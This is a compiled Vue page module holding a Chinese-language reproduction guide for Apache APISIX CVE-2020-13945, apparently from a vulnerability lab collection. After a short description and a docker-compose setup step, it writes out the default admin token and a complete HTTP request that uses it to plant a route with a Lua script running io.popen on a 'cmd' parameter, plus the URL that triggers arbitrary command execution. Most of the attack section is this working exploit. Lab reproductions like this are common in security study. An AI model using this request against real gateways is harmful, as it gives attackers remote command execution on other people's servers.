import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as o,a as e,b as n,d as a,e as l}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,[n("Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token "),e("code",null,"edd1c9f034335f136f87ad84b625c8f1"),n("，攻击者利用这个Token可以访问到管理员接口，进而通过"),e("code",null,"script"),n("参数来插入任意LUA脚本并执行。")],-1),p=e("p",null,"参考链接：",-1),v={href:"https://apisix.apache.org/docs/apisix/getting-started",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/apache/apisix/pull/2244",target:"_blank",rel:"noopener noreferrer"},m={href:"https://seclists.org/oss-sec/2020/q4/187",target:"_blank",rel:"noopener noreferrer"},g=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动一个Apache APISIX 2.11.0（这个漏洞并没有且应该不会被官方修复，所以到最新版仍然存在）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:9080</code>即可查看到默认的404页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用默认Token增加一个恶意的router，其中包含恶意LUA脚本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /apisix/admin/routes HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
    &quot;uri&quot;: &quot;/attack&quot;,
&quot;script&quot;: &quot;local _M = {} \\n function _M.access(conf, ctx) \\n local os = require(&#39;os&#39;)\\n local args = assert(ngx.req.get_uri_args()) \\n local f = assert(io.popen(args.cmd, &#39;r&#39;))\\n local s = assert(f:read(&#39;*a&#39;))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M&quot;,
    &quot;upstream&quot;: {
        &quot;type&quot;: &quot;roundrobin&quot;,
        &quot;nodes&quot;: {
            &quot;example.com:80&quot;: 1
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202212058881.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:9080/attack?cmd=id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202212059179.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function b(_,f){const i=s("ExternalLinkIcon");return r(),o("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",v,[n("https://apisix.apache.org/docs/apisix/getting-started"),a(i)])]),e("li",null,[e("a",h,[n("https://github.com/apache/apisix/pull/2244"),a(i)])]),e("li",null,[e("a",m,[n("https://seclists.org/oss-sec/2020/q4/187"),a(i)])])]),g])}const k=t(d,[["render",b],["__file","Apache APISIX 默认密钥漏洞 CVE-2020-13945.html.vue"]]);export{k as default};
